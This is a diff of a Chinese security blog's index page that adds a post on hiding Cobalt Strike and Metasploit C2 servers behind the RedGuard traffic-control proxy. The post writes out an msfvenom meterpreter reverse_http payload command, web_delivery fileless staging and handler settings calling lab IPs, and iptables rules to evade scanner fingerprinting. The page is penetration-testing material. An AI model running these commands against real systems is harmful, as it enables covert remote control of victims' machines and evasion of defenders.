@@ -66,7 +66,7 @@
 		</nav>
 		
 		<nav>
-    总文章数 38
+    总文章数 40
 </nav>
 		
 		<nav class="header-smart-menu">
@@ -230,6 +230,257 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    
+<article id="post-c2隐藏-RedGuard" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/02/c2%E9%9A%90%E8%97%8F-RedGuard/">c2隐藏-RedGuard</a>
+    </h1>
+  
+
+        
+
+        
+        
+        
+<a href="/2023/02/02/c2%E9%9A%90%E8%97%8F-RedGuard/" class="archive-article-date">
+  	<time datetime="2023-02-02T08:30:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-02-02</time>
+</a>
+        
+		
+	
+      </header>
+	  <div align="center" class="post-count">
+    字数：1k字 | 预计阅读时长：4分钟
+</div>
+	  
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3><span id="简介">简介</span></h3><p>前几天发现自己的服务器被fofa和微步情报标记为了cobaltstrike服务器，由于以前使用的版本没有对相应的特征做修改，导致被空间搜索引擎标记，刚好看到风起在朋友圈发布了RedGuard，于是赶紧试试鲜。</p>
+<p>RedGuard由风起大佬编写的一款c2前置流量控制工具，可以帮助红队更好的隐藏c2基础设施，且目前还在更新和完善之中，在写这篇文章之后又进行了2次更新，优化和增加了一些新功能。</p>
+<p><a href="https://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md" target="_blank" rel="noopener">github地址</a></p>
+<h3><span id="使用">使用</span></h3><p>第一次运行会在用户目录生成<strong>.RedGuard_CobaltStrike.ini</strong>文件，编辑此文件对其进行配置，当然也支持参数进行热配置。</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-05-31_22-17-54.png" alt></p>
+<p>重点关注proxy的3个配置</p>
+<ul>
+<li>Port_HTTPS</li>
+<li>port_HTTP</li>
+<li>HostTarget</li>
+</ul>
+<p>如上图，当前配置的意思是将Port_http的80端口绑定到本机127.0.0.1的8080端口，当有请求访问服务器的80端口，RedGuard会对请求特征做判断，当请求不符合规则(及host头不是360.net，这个可以随意设置)，请求会被重定向到<a href="https://360.net,否则请求会被转发到cs的监听端口8080端口。请求会不会被重定向取决于DROP参数，如DORP参数设置为true将直接丢弃请求包。" target="_blank" rel="noopener">https://360.net,否则请求会被转发到cs的监听端口8080端口。请求会不会被重定向取决于DROP参数，如DORP参数设置为true将直接丢弃请求包。</a></p>
+<p>同理,443端口被绑定到本机127.0.0.1的8443端口，当请求不符合规则时将请求重定向到<a href="https://360.net,当host头为360.com时将请求转发到cs的8443监听端口，主要取决于你cs的监听器是http还是https。" target="_blank" rel="noopener">https://360.net,当host头为360.com时将请求转发到cs的8443监听端口，主要取决于你cs的监听器是http还是https。</a></p>
+<p>更多设置，如过滤上线ip、上线时间、上线省份请参考作者官方文档<a href="https://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md" target="_blank" rel="noopener">RedGuard文档</a></p>
+<p>当然，这种场景适合将反代和cs服务器建在同一台机器上，比较节省资源，配合iptables可防止网络空间搜索引擎将你的服务器标记。</p>
+<h3><span id="cs">CS</span></h3><p>启动RedGuard <code>sudo ./RedGuard_64</code></p>
+<p>cs新建监听，c2端口设置为RedGaurd的反代端口，bind设置为cs的监听端口，注意host header可以随意设置，但一定要和配置文件里的一致。</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-05-31_22-42-34.png" alt></p>
+<p>再配置IPtables，只允许127.0.0.1访问本机的8443端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 8443 -j DROP <span class="comment">#丢弃所有访问8443端口的包</span></span><br><span class="line">iptables -I INPUT -p tcp -s 127.0.0.1 --dport 8443 -j ACCEPT <span class="comment">#只允许127.0.0.1访问本机的8443端口</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以正常上线了</p>
+<p>还有一种就是拿一台单独的服务器做反代服务器，另一台服务器做真正的cs服务器，只需简单修改配置文件即可</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-05-31_22-51-28.png" alt></p>
+<p>这里将192.168.1.8用作反代服务器，192.168.1.7作为真正的cs服务器，HosTtarget填写cs服务器的地址192.168.1.7</p>
+<p>新建cs监听，填写相应端口。</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-05-31_22-56-17.png" alt></p>
+<p>在cs服务器配置防火墙，只允许反向代理服务器来访问cs的监听端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 8443 -j DROP </span><br><span class="line">iptables -I INPUT -p tcp -s 192.168.1.8 --dport 8443 -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+<h3><span id="msf">MSF</span></h3><p>生成载荷</p>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_http  LHOST=10.197.10.131 LPORT=80  HttpHostHeader=360.net -f exe -o test.exe</code></p>
+<p>建立监听和设置参数，这里反代端口为80端口，80端口收到请求且符合规则后将其转发到本地的8080端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set LHOST 127.0.0.1</span><br><span class="line">set LPORT 8080</span><br><span class="line"> </span><br><span class="line">set OverrideLHOST 10.197.10.131 </span><br><span class="line">set overrideLPORT 80</span><br><span class="line">set overriderequesthost true</span><br><span class="line">set httphostheader 360.net </span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>配置防火墙</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 8080 -j DROP </span><br><span class="line">iptables -I INPUT -p tcp -s 127.0.0.1 --dport 8080 -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-06-01_17-20-16.png" alt></p>
+<p>在能执行命令的情况下，想方便点使用无文件落地的方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> target 2</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.8</span><br><span class="line"><span class="built_in">set</span> lport 80 <span class="comment">#端口设置为反向代理端口</span></span><br><span class="line"><span class="built_in">set</span> srvport 8082 <span class="comment">#用于下载stage</span></span><br><span class="line"><span class="built_in">set</span> httphostheader 360.net</span><br><span class="line"><span class="built_in">set</span> OverrideLhOST 192.168.1.8</span><br><span class="line"><span class="built_in">set</span> overrideLpoRT 80</span><br><span class="line"><span class="built_in">set</span> overriderequesthost <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span> <span class="comment">#关闭监听</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost 127.0.0.1</span><br><span class="line"><span class="built_in">set</span> lport 8080</span><br><span class="line"><span class="built_in">set</span> httphostheader 360.net</span><br><span class="line"><span class="built_in">set</span> OverrideLhOST 192.168.1.8</span><br><span class="line"><span class="built_in">set</span> overrideLpoRT 80</span><br><span class="line"><span class="built_in">set</span> overriderequesthost <span class="literal">true</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>同样配置防火墙</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 8080 -j DROP </span><br><span class="line">iptables -I INPUT -p tcp -s 127.0.0.1 --dport 8080 -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.laohuan.art/Snipaste_2022-06-05_15-47-01.png" alt></p>
+
+      
+
+
+
+      
+    </div>
+	
+	
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">工具分享</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/02/02/c2%E9%9A%90%E8%97%8F-RedGuard/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    
+<article id="post-PTE试题记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/02/PTE%E8%AF%95%E9%A2%98%E8%AE%B0%E5%BD%95/">PTE试题记录</a>
+    </h1>
+  
+
+        
+
+        
+        
+        
+<a href="/2023/02/02/PTE%E8%AF%95%E9%A2%98%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2023-02-02T08:26:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-02-02</time>
+</a>
+        
+		
+	
+      </header>
+	  <div align="center" class="post-count">
+    字数：1.4k字 | 预计阅读时长：7分钟
+</div>
+	  
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>对PTE考试的几道题做了一下总结记录。</p>
+        
+          <a class="article-more-a" href="/2023/02/02/PTE%E8%AF%95%E9%A2%98%E8%AE%B0%E5%BD%95/#more">more >></a>
+        
+      
+
+
+
+      
+    </div>
+	
+	
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">考试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/02/02/PTE%E8%AF%95%E9%A2%98%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
     
 <article id="post-Linux应急响应命令速查" class="article article-type-post  article-index" itemscope itemprop="blogPost">
@@ -1049,211 +1300,6 @@
 
 
   
-    
-<article id="post-有关Chrome相关0day漏洞复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/23/%E6%9C%89%E5%85%B3Chrome%E7%9B%B8%E5%85%B30day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">有关Chrome相关0day漏洞复现</a>
-    </h1>
-  
-
-        
-
-        
-        
-        
-<a href="/2021/04/23/%E6%9C%89%E5%85%B3Chrome%E7%9B%B8%E5%85%B30day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2021-04-23T03:01:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-23</time>
-</a>
-        
-		
-	
-      </header>
-	  <div align="center" class="post-count">
-    字数：3.7k字 | 预计阅读时长：21分钟
-</div>
-	  
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>2021年护网期间，国外安全研究员发布了chrome浏览器0day漏洞的poc，影响范围覆盖所有chrome版本(Google现已发布修复漏洞的正式版本 90.0.4430.85)，受害者只需访问一个含有漏洞利用代码的网页，攻击者便可控制接管计算机。但利用此漏洞需关闭chrome浏览器的沙盒模式，默认情况下此模式处于开启状态，想利用成功还需攻击者在诱导即其他方面多下点功夫。</p>
-<p>虽然chrome浏览器的沙盒默认处于开启状态，难以利用成功。但微信自带浏览器同样使用chrome内核，且沙盒默认处于关闭状态，利用微信将是一个不错的选择，目前腾讯官方已发布了修复漏洞的微信版本3.2.1.154。</p>
-        
-          <a class="article-more-a" href="/2021/04/23/%E6%9C%89%E5%85%B3Chrome%E7%9B%B8%E5%85%B30day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more">more >></a>
-        
-      
-
-
-
-      
-    </div>
-	
-	
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Chrome</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/漏洞复现//" class="article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/23/%E6%9C%89%E5%85%B3Chrome%E7%9B%B8%E5%85%B30day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    
-<article id="post-Discuz代码执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/26/Discuz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">Discuz代码执行</a>
-    </h1>
-  
-
-        
-
-        
-        
-        
-<a href="/2021/01/26/Discuz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="archive-article-date">
-  	<time datetime="2021-01-26T12:28:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-26</time>
-</a>
-        
-		
-	
-      </header>
-	  <div align="center" class="post-count">
-    字数：467字 | 预计阅读时长：2分钟
-</div>
-	  
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>Discuz是一套十分受欢迎的论坛软件系统，已拥有多年的应用历史和三十多万网站用户案例，是全球成熟度最高、覆盖率最大的论坛软件系统之一。由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p>
-        
-          <a class="article-more-a" href="/2021/01/26/Discuz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#more">more >></a>
-        
-      
-
-
-
-      
-    </div>
-	
-	
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Discuz</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/漏洞复现//" class="article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/26/Discuz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1268,7 +1314,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2022 Laohuan
+    		&copy; 2023 Laohuan
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -1469,6 +1515,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">考试</a>
               </li>
             
             <div class="clearfix"></div>
